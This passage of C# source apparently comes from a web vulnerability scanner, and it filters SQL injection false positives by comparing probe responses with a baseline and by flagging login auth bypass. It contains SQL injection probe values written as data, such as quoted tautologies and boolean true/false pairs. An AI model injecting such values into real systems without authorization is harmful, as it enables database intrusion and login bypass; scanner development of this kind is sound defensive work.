    /// When the noise-stripped probe body hash equals the baseline hash, there is no content oracle.
    /// Refuse union/boolean/auth-bypass (and identical-body "error") promotions — identical bodies must
    /// not become CRITICAL/HIGH SQLi findings.
    /// </summary>
    private static void ApplySqliIdenticalStrippedHashFalsePositiveHeuristics(
        List<SqliScanRow> rows, string baselineStrippedHash)
    {
        if (string.IsNullOrEmpty(baselineStrippedHash)) return;

        foreach (var r in rows)
        {
            if (string.IsNullOrEmpty(r.ProbeStrippedHash)) continue;
            if (!string.Equals(r.ProbeStrippedHash, baselineStrippedHash, StringComparison.Ordinal))
                continue;

            // Timing is independent of body content — keep only time-based signals.
            var keep = r.Types
                .Where(t => t.Contains("time-based", StringComparison.OrdinalIgnoreCase))
                .Distinct(StringComparer.OrdinalIgnoreCase)
                .ToList();
            r.Types.Clear();
            r.Types.AddRange(keep);
            // SQL error signatures present in an identical-to-baseline body were already in baseline.
            r.SqlHits.Clear();
        }
    }

    private static bool SqliPayloadImplementsUnionInjection(string payload) =>
        payload.IndexOf("UNION", StringComparison.OrdinalIgnoreCase) >= 0;

    private static bool DetectUnionLeakMarkers(string bodySample, string baselineBody)
    {
        if (string.IsNullOrEmpty(bodySample)) return false;
        foreach (var marker in UnionLeakMarkers)
        {
            if (bodySample.Contains(marker, StringComparison.Ordinal)
                && !baselineBody.Contains(marker, StringComparison.Ordinal))
                return true;
        }

        if (baselineBody.Length > 0 && bodySample.Length > 0)
        {
            var ratio = (double)bodySample.Length / Math.Max(baselineBody.Length, 1);
            if (ratio >= 2.5 || (ratio <= 0.4 && bodySample.Length > 0))
            {
                // Size delta alone is weak; require UNION in recent payload context handled by caller types
            }
        }

        return false;
    }

    private static bool SqliColumnMentionLooksLikeDatabaseError(string body)
    {
        if (string.IsNullOrEmpty(body)) return false;
        return body.Contains("unknown column", StringComparison.OrdinalIgnoreCase)
               || body.Contains("invalid column name", StringComparison.OrdinalIgnoreCase)
               || body.Contains("duplicate column name", StringComparison.OrdinalIgnoreCase)
               || body.Contains("ambiguous column name", StringComparison.OrdinalIgnoreCase)
               || body.Contains("column not found", StringComparison.OrdinalIgnoreCase)
               || body.Contains("ORA-00904", StringComparison.OrdinalIgnoreCase)
               || body.Contains("no such column:", StringComparison.OrdinalIgnoreCase)
               || (body.Contains("sqlite3.OperationalError:", StringComparison.OrdinalIgnoreCase)
                   && body.Contains("no such column", StringComparison.OrdinalIgnoreCase));
    }

    private static bool SqliUnionKeywordLikelyReflectionOnly(string bodySample, string baselineBody, string payload, List<ResponseBodySecurityHeuristics.SqlSignatureHit> sqlHits)
    {
        if (sqlHits.Count > 0) return false;
        if (!payload.Contains("UNION", StringComparison.OrdinalIgnoreCase)) return false;

        if (bodySample.Contains(payload, StringComparison.OrdinalIgnoreCase))
            return true;

        try
        {
            var decoded = Uri.UnescapeDataString(bodySample);
            if (decoded.Contains(payload, StringComparison.OrdinalIgnoreCase))
                return true;
        }
        catch (UriFormatException) { /* ignore */ }

        var relaxedBody = bodySample.Replace("\\\"", "'", StringComparison.Ordinal);
        var relaxedPayload = payload.Replace('"', '\'');
        if (relaxedBody.Contains(relaxedPayload, StringComparison.OrdinalIgnoreCase))
            return true;

        if (baselineBody.IndexOf("UNION", StringComparison.OrdinalIgnoreCase) < 0
            && bodySample.IndexOf("UNION", StringComparison.OrdinalIgnoreCase) >= 0
            && ApproxBodyDeltaMatchesPayloadGrowth(baselineBody, bodySample, payload))
            return true;

        return false;
    }

    private static bool ApproxBodyDeltaMatchesPayloadGrowth(string baseline, string mutated, string payload)
    {
        if (string.IsNullOrEmpty(payload)) return false;
        var delta = mutated.Length - baseline.Length;

        var payloadLenCeiling = Encoding.UTF8.GetByteCount(payload) + Math.Max(payload.Length / 8, 72);
        if (delta <= 0 || delta > payloadLenCeiling + 480) return false;

        return payload.Contains("'1'='1", StringComparison.Ordinal)
               || payload.Contains("1 OR 1=1", StringComparison.Ordinal)
               || payload.Contains(" UNION ", StringComparison.Ordinal);
    }

    /// <summary>
    /// Pairs of tautology vs falsity payloads from the default set — identical responses mean no boolean split
    /// for that pair only (payload keys are normalized to strip trailing SQL comments).
    /// </summary>
    private static readonly (string Truthy, string Falsy)[] SqliBooleanPairs =
    [
        ("1 AND 1=1", "1 AND 1=2"),
        ("1 AND 1=1--", "1 AND 1=2--"),
        ("1' AND '1'='1", "1' AND '1'='2"),
    ];

    /// <summary>Strip trailing SQL line/block comments so <c>1 AND 1=1--</c> matches <c>1 AND 1=1</c>.</summary>
    internal static string NormalizeSqliPayloadKey(string payload)
    {
        var p = payload.Trim();
        foreach (var marker in new[] { "--", "#", "/*" })
        {
            var idx = p.IndexOf(marker, StringComparison.Ordinal);
            if (idx >= 0)
                p = p[..idx].TrimEnd();
        }
        return p;
    }

    /// <summary>True for quoted tautologies and unquoted <c>AND/OR 1=1|1=2</c> boolean probes.</summary>
    internal static bool LooksLikeBooleanSqliPayload(string payload)
    {
        if (string.IsNullOrEmpty(payload)) return false;
        if (payload.Contains("'1'='1", StringComparison.Ordinal)
            || payload.Contains("'1'='2", StringComparison.Ordinal))
            return true;
        if (payload.Contains('\'')
            && (payload.Contains("1=1", StringComparison.Ordinal) || payload.Contains("1=2", StringComparison.Ordinal)))
            return true;

        var key = NormalizeSqliPayloadKey(payload);
        return key.Contains("AND 1=1", StringComparison.OrdinalIgnoreCase)
               || key.Contains("AND 1=2", StringComparison.OrdinalIgnoreCase)
               || key.Contains("OR 1=1", StringComparison.OrdinalIgnoreCase)
               || key.Contains("OR 1=2", StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>
    /// Post-scan false-positive reduction. Strips heuristic-only findings when:
    /// <list type="bullet">
    /// <item>A specific boolean pair (1 AND 1=1 vs 1 AND 1=2) produces identical responses — strip only that pair.</item>
    /// <item>Body length differences are explained by reflected payload text (count × encoded length), with no row or cell change.</item>
    /// <item>Every injection returns the same SPA shell response (catch-all route).</item>
    /// </list>
    /// </summary>
    private static void ApplySqliSpaShellFalsePositiveHeuristics(List<SqliScanRow> rows, int baselineStatus, string baselineText)
    {
        if (rows.Count < 2) return;

        var byNormalized = new Dictionary<string, SqliScanRow>(StringComparer.OrdinalIgnoreCase);
        foreach (var r in rows)
        {
            var key = NormalizeSqliPayloadKey(r.Payload);
            byNormalized.TryAdd(key, r);
        }

        // --- Boolean-pair check: only strip rows belonging to pairs that show no split.
        //     A broken quote-pair that always returns the same SQL error must not clear a
        //     working unquoted boolean differential on the same parameter.
        //     Compare after neutralizing payload echo (form value reflection).
        foreach (var (truthy, falsy) in SqliBooleanPairs)
        {
            var tKey = NormalizeSqliPayloadKey(truthy);
            var fKey = NormalizeSqliPayloadKey(falsy);
            if (!byNormalized.TryGetValue(tKey, out var tRow) || !byNormalized.TryGetValue(fKey, out var fRow))
                continue;
            if (tRow.Status != fRow.Status)
                continue;

            var tNeutral = NeutralizePayloadReflection(tRow.ProbeEvidenceSample, tRow.Payload);
            var fNeutral = NeutralizePayloadReflection(fRow.ProbeEvidenceSample, fRow.Payload);
            var sameAfterNeutral =
                string.Equals(
                    ResponseBodySecurityHeuristics.CanonicalSecurityEvidenceHash(tNeutral),
                    ResponseBodySecurityHeuristics.CanonicalSecurityEvidenceHash(fNeutral),
                    StringComparison.Ordinal)
                || (tRow.BodyLength == fRow.BodyLength
                    && Math.Abs(tNeutral.Length - fNeutral.Length) < 4);
            if (!sameAfterNeutral)
                continue;

            foreach (var r in rows)
            {
                var key = NormalizeSqliPayloadKey(r.Payload);
                if (key.Equals(tKey, StringComparison.OrdinalIgnoreCase)
                    || key.Equals(fKey, StringComparison.OrdinalIgnoreCase))
                {
                    StripSqliHeuristicTypes(r, "blind-boolean-suspected");
                    StripSqliHeuristicTypes(r, "blind-boolean-confirmed");
                }
            }
        }

        // Echoed payloads (form action, hidden fields, sort links) change byte length
        // by reflection count × encoded length. That is not a SQLi oracle.
        ApplySqliReflectionExplainedLengthHeuristics(rows);

        // --- SPA shell check (existing): uniform HTML shell for all payloads.
        var distinctFingerprints = rows.Select(r => (r.Status, r.BodyLength)).Distinct().ToList();
        if (distinctFingerprints.Count != 1) return;

        var sample = rows[0].Body ?? "";
        if (!SqliResponseLooksLikeHtmlShell(sample)) return;
        if (rows[0].Status == baselineStatus && rows[0].BodyLength == baselineText.Length) return;

        foreach (var r in rows)
        {
            StripSqliHeuristicTypes(r, "blind-boolean-suspected");
            StripSqliHeuristicTypes(r, "auth-bypass-suspected");
        }
    }

    /// <summary>
    /// Allowance for incidental token or whitespace noise after reflection is subtracted.
    /// Kept below a typical extra table row so unexplained data still escalates.
    /// </summary>
    private const int ReflectionLengthToleranceBytes = 48;

    private static readonly Regex HtmlTrRegex = new(
        @"<tr\b", RegexOptions.IgnoreCase | RegexOptions.Compiled);

    private static readonly Regex HtmlThRegex = new(
        @"<th\b", RegexOptions.IgnoreCase | RegexOptions.Compiled);

    private static readonly Regex HtmlTdRegex = new(
        @"<td\b", RegexOptions.IgnoreCase | RegexOptions.Compiled);

    private static readonly string[] JsonRowArrayNames =
    [
        "data", "results", "items", "rows", "records", "products", "users", "values"
    ];

    /// <summary>How many times the payload is newly echoed, and how many bytes those echoes occupy.</summary>
    internal readonly record struct SqliReflectionAccount(int Count, int ReflectedBytes);

    /// <summary>
    /// True when the probe/baseline length gap is accounted for by verbatim, URL-encoded,
    /// or HTML-encoded copies of <paramref name="payload"/> (reflection count × encoded length,
    /// or the same copies replacing <paramref name="baselineValue"/>).
    /// A new SQL error, UNION leak marker, data-row count, or table-cell count blocks this.
    /// </summary>
    internal static bool PayloadReflectionExplainsLengthDelta(
        string? baselineBody,
        string? probeBody,
        string? payload,
        string? baselineValue)
    {
        if (string.IsNullOrEmpty(probeBody) || string.IsNullOrEmpty(payload) || payload.Length < 3)
            return false;

        baselineBody ??= "";
        if (ProbeHasNewSqlSignal(baselineBody, probeBody))
            return false;
        if (DetectUnionLeakMarkers(probeBody, baselineBody))
            return false;

        var baselineRows = TryCountResponseDataRows(baselineBody);
        var probeRows = TryCountResponseDataRows(probeBody);
        if (baselineRows is int expectedRows && probeRows is int actualRows && expectedRows != actualRows)
            return false;
        if (HtmlCellCountDiverged(baselineBody, probeBody))
            return false;

        var account = MeasurePayloadReflection(baselineBody, probeBody, payload, baselineValue);
        if (account.Count <= 0)
            return false;

        var actualDelta = probeBody.Length - baselineBody.Length;
        if (Math.Abs(actualDelta - account.ReflectedBytes) <= ReflectionLengthToleranceBytes)
            return true;

        var baselineLen = baselineValue?.Length ?? 0;
        if (baselineLen > 0
            && Math.Abs(actualDelta - (account.ReflectedBytes - account.Count * baselineLen))
                <= ReflectionLengthToleranceBytes)
            return true;

        return ReflectionSubstitutionResidual(baselineBody, probeBody, payload, baselineValue ?? "")
               <= ReflectionLengthToleranceBytes;
    }

    /// <summary>Count payload echoes present in the probe body but not the baseline.</summary>
    internal static SqliReflectionAccount MeasurePayloadReflection(
        string? baselineBody,
        string? probeBody,
        string? payload,
        string? baselineValue)
    {
        if (string.IsNullOrEmpty(probeBody) || string.IsNullOrEmpty(payload) || payload.Length < 3)
            return new SqliReflectionAccount(0, 0);

        var pairs = BuildReflectionFormPairs(payload, baselineValue ?? "");
        var probe = CountReflectionForms(probeBody, pairs);
        var baseline = CountReflectionForms(baselineBody ?? "", pairs);
        return new SqliReflectionAccount(
            Math.Max(0, probe.Count - baseline.Count),
            Math.Max(0, probe.Bytes - baseline.Bytes));
    }

    /// <summary>
    /// HTML <c>&lt;tr&gt;</c> data rows, or a JSON array / known list property.
    /// Null when the body has no row-shaped payload to compare.
    /// </summary>
    internal static int? TryCountResponseDataRows(string? body)
    {
        if (string.IsNullOrWhiteSpace(body)) return null;
        var trimmed = body.TrimStart();
        if (trimmed.StartsWith('[') || trimmed.StartsWith('{'))
            return TryCountJsonDataRows(trimmed);
        return TryCountHtmlDataRows(body);
    }

    /// <summary>
    /// 1=1 vs 1=2 changed the returned row count, and no equal-length non-boolean pair disagreed.
    /// </summary>
    internal static bool BooleanPairRowCountsCorroborate(
        SqliScanRow truthy,
        SqliScanRow falsy,
        IReadOnlyList<SqliScanRow> rows)
    {
        if (truthy.DataRowCount is not int tRows || falsy.DataRowCount is not int fRows || tRows == fRows)
            return false;
        return !RowCountOracleUnstable(rows, truthy, falsy);
    }

    /// <summary>
    /// Two UNION arities differ only because each payload is echoed. Not a column-count oracle.
    /// </summary>
    internal static bool UnionPairIsReflectionArtifact(SqliScanRow a, SqliScanRow b)
    {
        if (a.SqlHits.Count > 0 || b.SqlHits.Count > 0) return false;
        if (a.Status != b.Status) return false;
        if (a.DataRowCount is int aRows && b.DataRowCount is int bRows && aRows != bRows)
            return false;
        if (a.Types.Contains("union-leak-suspected", StringComparer.OrdinalIgnoreCase)
            || b.Types.Contains("union-leak-suspected", StringComparer.OrdinalIgnoreCase))
            return false;
        return a.LengthDeltaExplainedByReflection && b.LengthDeltaExplainedByReflection;
    }

    /// <summary>
    /// Drop length-only boolean and UNION promotions when reflection already explains the body size.
    /// Keeps SQL errors, auth-bypass, time-based delays, and UNION leak markers.
    /// </summary>
    internal static void ApplySqliReflectionExplainedLengthHeuristics(List<SqliScanRow> rows)
    {
        foreach (var r in rows)
        {
            if (!r.LengthDeltaExplainedByReflection || r.DataRowCountDiverged || r.SqlHits.Count > 0)
                continue;

            StripSqliHeuristicTypes(r, "blind-boolean-suspected");
            if (r.Types.Contains("union-leak-suspected", StringComparer.OrdinalIgnoreCase)
                || r.Types.Contains("error-based", StringComparer.OrdinalIgnoreCase))
                continue;

            StripSqliHeuristicTypes(r, "union-based");
            StripSqliHeuristicTypes(r, "union-column-match");
        }
    }

    private static bool RowCountOracleUnstable(
        IReadOnlyList<SqliScanRow> rows,
        SqliScanRow truthy,
        SqliScanRow falsy)
    {
        var controls = rows.Where(r =>
            r.DataRowCount.HasValue
            && !string.Equals(r.Payload, truthy.Payload, StringComparison.Ordinal)
            && !string.Equals(r.Payload, falsy.Payload, StringComparison.Ordinal)
            && !LooksLikeBooleanSqliPayload(r.Payload)).ToList();

        foreach (var group in controls.GroupBy(r => r.Payload.Length))
        {
            if (group.Count() < 2) continue;
            if (group.Select(r => r.DataRowCount!.Value).Distinct().Count() > 1)
                return true;
        }

        return false;
    }

    private static bool ProbeHasNewSqlSignal(string baselineBody, string probeBody)
    {
        if (SqliColumnMentionLooksLikeDatabaseError(probeBody)
            && !SqliColumnMentionLooksLikeDatabaseError(baselineBody))
            return true;

        var baselinePatterns = ResponseBodySecurityHeuristics.DetectSqlErrorSignatures(baselineBody)
            .Select(h => h.Pattern)
            .ToHashSet(StringComparer.OrdinalIgnoreCase);
        foreach (var hit in ResponseBodySecurityHeuristics.DetectSqlErrorSignatures(probeBody))
        {
            if (!baselinePatterns.Contains(hit.Pattern))
                return true;
        }

        return false;
    }

    private static bool HtmlCellCountDiverged(string baselineBody, string probeBody)
    {
        if (baselineBody.IndexOf('<') < 0 && probeBody.IndexOf('<') < 0)
            return false;
        return HtmlTdRegex.Matches(baselineBody).Count != HtmlTdRegex.Matches(probeBody).Count;
    }

    private static int? TryCountHtmlDataRows(string html)
    {
        var tr = HtmlTrRegex.Matches(html).Count;
        if (tr == 0) return null;
        if (HtmlThRegex.IsMatch(html))
            return Math.Max(0, tr - 1);
        return tr;
    }

    private static int? TryCountJsonDataRows(string json)
    {
        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;
            if (root.ValueKind == JsonValueKind.Array)
                return root.GetArrayLength();
            if (root.ValueKind != JsonValueKind.Object)
                return null;

            foreach (var prop in root.EnumerateObject())
            {
                if (prop.Value.ValueKind != JsonValueKind.Array) continue;
                foreach (var name in JsonRowArrayNames)
                {
                    if (prop.Name.Equals(name, StringComparison.OrdinalIgnoreCase))
                        return prop.Value.GetArrayLength();
                }
            }
        }
        catch (JsonException)
        {
            return null;
        }

        return null;
    }

    private readonly record struct ReflectionFormPair(string PayloadForm, string BaselineForm);

    private static List<ReflectionFormPair> BuildReflectionFormPairs(string payload, string baselineValue)
    {
        var rawPairs = new (string Payload, string Baseline)[]
        {
            (payload, baselineValue),
            (Uri.EscapeDataString(payload), Uri.EscapeDataString(baselineValue)),
            (LowercasePercentHex(Uri.EscapeDataString(payload)), LowercasePercentHex(Uri.EscapeDataString(baselineValue))),
            (HttpUtility.UrlEncode(payload) ?? payload, HttpUtility.UrlEncode(baselineValue) ?? baselineValue),
            (System.Net.WebUtility.HtmlEncode(payload), System.Net.WebUtility.HtmlEncode(baselineValue)),
            (HttpUtility.HtmlEncode(payload), HttpUtility.HtmlEncode(baselineValue)),
            (EncodeQuotes(payload, "&#39;", "&quot;"), EncodeQuotes(baselineValue, "&#39;", "&quot;")),
            (EncodeQuotes(payload, "&#x27;", "&quot;"), EncodeQuotes(baselineValue, "&#x27;", "&quot;")),
            (EncodeQuotes(payload, "&apos;", "&quot;"), EncodeQuotes(baselineValue, "&apos;", "&quot;")),
        };

        var seen = new HashSet<string>(StringComparer.Ordinal);
        var list = new List<ReflectionFormPair>();
        foreach (var (form, baselineForm) in rawPairs)
        {
            if (string.IsNullOrEmpty(form) || form.Length < 3) continue;
            if (string.Equals(form, baselineForm, StringComparison.Ordinal)) continue;
            if (!seen.Add(form)) continue;
            list.Add(new ReflectionFormPair(form, baselineForm ?? ""));
        }

        list.Sort((a, b) => b.PayloadForm.Length.CompareTo(a.PayloadForm.Length));
        return list;
    }

    private static (int Count, int Bytes) CountReflectionForms(string body, List<ReflectionFormPair> pairs)
    {
        var work = body;
        var count = 0;
        var bytes = 0;
        foreach (var pair in pairs)
        {
            var variant = pair.PayloadForm;
            var n = 0;
            var idx = 0;
            while (idx < work.Length)
            {
                var found = work.IndexOf(variant, idx, StringComparison.Ordinal);
                if (found < 0) break;
                n++;
                idx = found + variant.Length;
            }

            if (n == 0) continue;
            count += n;
            bytes += n * variant.Length;
            work = work.Replace(variant, new string('\u0001', variant.Length), StringComparison.Ordinal);
        }

        return (count, bytes);
    }

    /// <summary>
    /// Replace each echoed payload form with the same encoding of the baseline value and return
    /// the leftover length gap. Near zero means the delta was reflection.
    /// </summary>
    private static int ReflectionSubstitutionResidual(
        string baselineBody,
        string probeBody,
        string payload,
        string baselineValue)
    {
        var work = probeBody;
        foreach (var pair in BuildReflectionFormPairs(payload, baselineValue))
        {
            if (pair.PayloadForm.Equals(pair.BaselineForm, StringComparison.Ordinal)) continue;
            work = work.Replace(pair.PayloadForm, pair.BaselineForm, StringComparison.Ordinal);
        }

        return Math.Abs(work.Length - baselineBody.Length);
    }

    private static string EncodeQuotes(string value, string apostrophe, string quote) =>
        value.Replace("'", apostrophe, StringComparison.Ordinal)
            .Replace("\"", quote, StringComparison.Ordinal);

    private static string LowercasePercentHex(string value)
    {
        var sb = new StringBuilder(value.Length);
        for (var i = 0; i < value.Length; i++)
        {
            if (value[i] == '%' && i + 2 < value.Length
                && Uri.IsHexDigit(value[i + 1]) && Uri.IsHexDigit(value[i + 2]))
            {
                sb.Append('%');
                sb.Append(char.ToLowerInvariant(value[i + 1]));
                sb.Append(char.ToLowerInvariant(value[i + 2]));
                i += 2;
            }
            else
            {
                sb.Append(value[i]);
            }
        }

        return sb.ToString();
    }

    private static void StripSqliHeuristicTypes(SqliScanRow row, string type)
    {
        row.Types.RemoveAll(t => t.Equals(type, StringComparison.OrdinalIgnoreCase));
    }

    /// <summary>
    /// Generic 4xx validation bodies (e.g. "Invalid product ID") vs a 2xx baseline are not boolean SQLi oracles.
    /// </summary>
    private static void ApplySqliInputValidationFalsePositiveHeuristics(
        List<SqliScanRow> rows,
        int baselineStatus,
        string baselineBody)
    {
        foreach (var row in rows)
        {
            if (!row.Types.Contains("blind-boolean-suspected", StringComparer.OrdinalIgnoreCase))
                continue;
            if (row.Types.Contains("blind-boolean-confirmed", StringComparer.OrdinalIgnoreCase))
                continue;
            if (row.SqlHits.Count > 0)
                continue;

            if (LooksLikeInputValidationRejection(row.Status, row.Body, baselineStatus, baselineBody))
            {
                StripSqliHeuristicTypes(row, "blind-boolean-suspected");
                StripSqliHeuristicTypes(row, "auth-bypass-suspected");
            }
        }
    }

    private static bool LooksLikeInputValidationRejection(
        int probeStatus,
        string? probeBody,
        int baselineStatus,
        string? baselineBody)
    {
        if (probeStatus is not (400 or 404 or 422))
            return false;

        var body = (probeBody ?? "").Trim();
        if (body.Length == 0 || body.Length > 512)
            return false;

        if (baselineStatus is >= 200 and < 300)
            return BodyLooksLikeValidationMessage(body);

        if (baselineStatus is >= 400 and < 500
            && !string.IsNullOrEmpty(baselineBody)
            && BodyLooksLikeValidationMessage(baselineBody)
            && BodyLooksLikeValidationMessage(body))
            return true;

        return false;
    }

    private static bool BodyLooksLikeValidationMessage(string body)
    {
        var sample = body.Length <= 256 ? body : body[..256];
        var lower = sample.ToLowerInvariant();
        if (lower.Contains("invalid", StringComparison.Ordinal)
            || lower.Contains("validation", StringComparison.Ordinal)
            || lower.Contains("not found", StringComparison.Ordinal)
            || lower.Contains("bad request", StringComparison.Ordinal)
            || lower.Contains("malformed", StringComparison.Ordinal))
            return true;

        return lower.Contains("\"error\"", StringComparison.Ordinal)
               && (lower.Contains("invalid", StringComparison.Ordinal)
                   || lower.Contains("validation", StringComparison.Ordinal));
    }

    private static bool SqliResponseLooksLikeHtmlShell(string bodySample)
    {
        if (string.IsNullOrEmpty(bodySample)) return false;
        var t = bodySample.TrimStart();
        if (t.StartsWith('{') || t.StartsWith('[')) return false;
        if (t.StartsWith("<!DOCTYPE", StringComparison.OrdinalIgnoreCase)) return true;
        if (t.StartsWith("<html", StringComparison.OrdinalIgnoreCase)) return true;
        if (bodySample.Contains("<head", StringComparison.OrdinalIgnoreCase) &&
            bodySample.Contains("<body", StringComparison.OrdinalIgnoreCase))
            return true;
        if (bodySample.Contains("<app-root", StringComparison.OrdinalIgnoreCase)) return true;
        return false;
    }

    /// <summary>
    /// Unified auth-bypass heuristic for login-like POSTs with tautology SQLi payloads.
    /// Covers 401/403 shifts, JSON token emergence (separate helper), form redirect divergence,
    /// and same-status HTML login-failure vs authenticated-area body shifts.
    /// </summary>
    private static bool IsSqliAuthBypassSuspectedHeuristic(
        string method,
        string? bodyTemplate,
        Dictionary<string, string>? headers,
        int baselineStatus,
        int responseStatus,
        string baselineBody,
        string responseBody,
        string payload,
        string? baselineLocation,
        string? responseLocation)
    {
        if (!string.Equals(method, "POST", StringComparison.OrdinalIgnoreCase))
            return false;
        if (!SqliBodySuggestsLoginForm(bodyTemplate, headers))
            return false;
        if (!TautologyPayloadLooksSqlLike(payload))
            return false;

        if ((baselineStatus == 401 || baselineStatus == 403)
            && responseStatus >= 200 && responseStatus < 300)
            return true;

        if (RedirectLocationSuggestsAuthBypass(baselineStatus, responseStatus, baselineLocation, responseLocation))
            return true;

        if (IsSqliLoginResponseContentBypass(baselineStatus, responseStatus, baselineBody, responseBody))
            return true;

        return false;
    }

    private static bool SqliBodySuggestsLoginForm(string? bodyTemplate, Dictionary<string, string>? headers)
    {
        if (string.IsNullOrWhiteSpace(bodyTemplate))
            return false;

        var trimmed = bodyTemplate.TrimStart();
        if (trimmed.StartsWith('{') || trimmed.StartsWith('['))
        {
            try
            {
                using var doc = JsonDocument.Parse(bodyTemplate);
                return JsonBodySuggestsLoginForm(doc.RootElement);
            }
            catch (JsonException)
            {
                return false;
            }
        }

        if (SqliBodyTemplateIsFormEncoded(bodyTemplate, headers))
            return FormFieldNamesSuggestLogin(ReadFormFieldNames(bodyTemplate));

        return FormBodyTemplateSuggestsLoginBySubstring(bodyTemplate);
    }

    private static IEnumerable<string> ReadFormFieldNames(string bodyTemplate)
    {
        var qs = HttpUtility.ParseQueryString(bodyTemplate);
        foreach (string? key in qs)
        {
            if (key != null)
                yield return key;
        }
    }

    private static bool FormFieldNamesSuggestLogin(IEnumerable<string> names)
    {
        var hasSecret = false;
        var hasIdentity = false;
        foreach (var name in names)
        {
            if (FieldNameSuggestsSecret(name)) hasSecret = true;
            if (FieldNameSuggestsIdentity(name)) hasIdentity = true;
        }

        return hasSecret && hasIdentity;
    }

    private static bool FormBodyTemplateSuggestsLoginBySubstring(string bodyTemplate)
    {
        var lower = bodyTemplate.ToLowerInvariant();
        var hasSecret = lower.Contains("password") || lower.Contains("passwd") || lower.Contains("passw=")
            || lower.Contains("pass=") || lower.Contains("pwd=");
        var hasIdentity = lower.Contains("email=") || lower.Contains("username=") || lower.Contains("user_name=")
            || lower.Contains("login=") || lower.Contains("account=") || lower.Contains("uid=")
            || lower.Contains("userid=") || lower.Contains("user_id=");
        return hasSecret && hasIdentity;
    }

    private static bool FieldNameSuggestsSecret(string name) =>
        name.Equals("password", StringComparison.OrdinalIgnoreCase)
        || name.Equals("passwd", StringComparison.OrdinalIgnoreCase)
        || name.Equals("pwd", StringComparison.OrdinalIgnoreCase)
        || name.Equals("passw", StringComparison.OrdinalIgnoreCase)
        || name.Equals("pass", StringComparison.OrdinalIgnoreCase);

    private static bool FieldNameSuggestsIdentity(string name) =>
        name.Equals("email", StringComparison.OrdinalIgnoreCase)
        || name.Equals("username", StringComparison.OrdinalIgnoreCase)
        || name.Equals("userid", StringComparison.OrdinalIgnoreCase)
        || name.Equals("user_id", StringComparison.OrdinalIgnoreCase)
        || name.Equals("uid", StringComparison.OrdinalIgnoreCase)
        || name.Equals("user", StringComparison.OrdinalIgnoreCase)
        || name.Equals("user_name", StringComparison.OrdinalIgnoreCase)
        || name.Equals("login", StringComparison.OrdinalIgnoreCase)
        || name.Equals("account", StringComparison.OrdinalIgnoreCase);

    private static bool RedirectLocationSuggestsAuthBypass(
        int baselineStatus,
        int responseStatus,
        string? baselineLocation,
        string? responseLocation)
    {
        if (responseStatus is < 300 or >= 400 || string.IsNullOrWhiteSpace(responseLocation))
            return false;

        if (!IsRedirectStatus(baselineStatus) && IsRedirectStatus(responseStatus)
            && !LocationLooksLikeLoginOrError(responseLocation))
            return true;

        if (!IsRedirectStatus(baselineStatus) || string.IsNullOrWhiteSpace(baselineLocation))
            return false;

        if (LocationsEquivalent(baselineLocation, responseLocation))
            return false;

        return LocationLooksLikeLoginOrError(baselineLocation)
            && !LocationLooksLikeLoginOrError(responseLocation);
    }

    private static bool IsRedirectStatus(int status) => status is >= 300 and < 400;

    private static bool LocationsEquivalent(string a, string b)
    {
        if (string.Equals(a, b, StringComparison.OrdinalIgnoreCase))
            return true;

        if (!Uri.TryCreate(a, UriKind.RelativeOrAbsolute, out var ua)
            || !Uri.TryCreate(b, UriKind.RelativeOrAbsolute, out var ub))
            return false;

        var pathA = ua.IsAbsoluteUri ? ua.AbsolutePath : ua.OriginalString.Split('?', '#')[0];
        var pathB = ub.IsAbsoluteUri ? ub.AbsolutePath : ub.OriginalString.Split('?', '#')[0];
        return string.Equals(pathA.TrimEnd('/'), pathB.TrimEnd('/'), StringComparison.OrdinalIgnoreCase);
    }

    private static bool LocationLooksLikeLoginOrError(string location)
    {
        var lower = location.ToLowerInvariant();
        return lower.Contains("login") || lower.Contains("signin") || lower.Contains("sign-in")
            || lower.Contains("sign_in") || lower.Contains("/auth") || lower.Contains("error")
            || lower.Contains("invalid") || lower.Contains("denied") || lower.Contains("failed");
    }

    private static bool IsSqliLoginResponseContentBypass(
        int baselineStatus,
        int responseStatus,
        string baselineBody,
        string responseBody)
    {
        if (baselineStatus < 200 || baselineStatus >= 300)
            return false;
        if (responseStatus < 200 || responseStatus >= 300)
            return false;

        var baselineHash = ResponseBodySecurityHeuristics.CanonicalSecurityEvidenceHash(baselineBody);
        var responseHash = ResponseBodySecurityHeuristics.CanonicalSecurityEvidenceHash(responseBody);
        if (baselineHash == responseHash)
            return false;

        var baselineFailed = HtmlBodySuggestsLoginFailure(baselineBody);
        var responseFailed = HtmlBodySuggestsLoginFailure(responseBody);
        var responseAuthed = HtmlBodySuggestsAuthenticatedArea(responseBody);

        if (baselineFailed && (responseAuthed || !responseFailed))
            return true;

        if (baselineFailed
            && Math.Abs(responseBody.Length - baselineBody.Length) > Math.Max(100, baselineBody.Length / 5))
            return true;

        return false;
    }

    private static bool HtmlBodySuggestsLoginFailure(string body)
    {
        if (string.IsNullOrWhiteSpace(body)) return false;
        return ContainsAny(body,
            "invalid password", "invalid credentials", "incorrect password", "wrong password",
            "login failed", "log in failed", "authentication failed", "auth failed",
            "access denied", "bad credentials", "unable to log in", "unable to login",
            "username or password", "password is incorrect", "failed to sign in");
    }

    private static bool HtmlBodySuggestsAuthenticatedArea(string body)
    {
        if (string.IsNullOrWhiteSpace(body)) return false;
        return ContainsAny(body,
            "logout", "log out", "sign out", "signout", "my account", "my profile",
            "dashboard", "welcome back", "logged in as", "you are now logged in");
    }

    private static bool ContainsAny(string haystack, params string[] needles)
    {
        foreach (var needle in needles)
        {
            if (haystack.Contains(needle, StringComparison.OrdinalIgnoreCase))
                return true;
        }

        return false;
    }

    private static bool JsonBodySuggestsLoginForm(JsonElement root)
    {
        if (root.ValueKind != JsonValueKind.Object)
            return false;

        var names = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        foreach (var p in root.EnumerateObject())
            names.Add(p.Name);

        return FormFieldNamesSuggestLogin(names);
    }

    /// <summary>
    /// JSON APIs (e.g. Express + juice-shop) often return HTTP 200 for both failed login and success; a session/JWT may
    /// appear only in the body after a tautology. Complements 401/403-based <see cref="IsSqliAuthBypassHeuristic"/>.
    /// </summary>
    private static bool IsSqliLoginTokenEmergenceHeuristic(
        string method,
        string? bodyTemplate,
        int baselineStatus,
        int responseStatus,
        string baselineBody,
        string responseBody,
        string payload)
    {
        if (!string.Equals(method, "POST", StringComparison.OrdinalIgnoreCase)) return false;
        if (responseStatus < 200 || responseStatus >= 300) return false;
        if (baselineStatus < 200 || baselineStatus >= 300) return false;
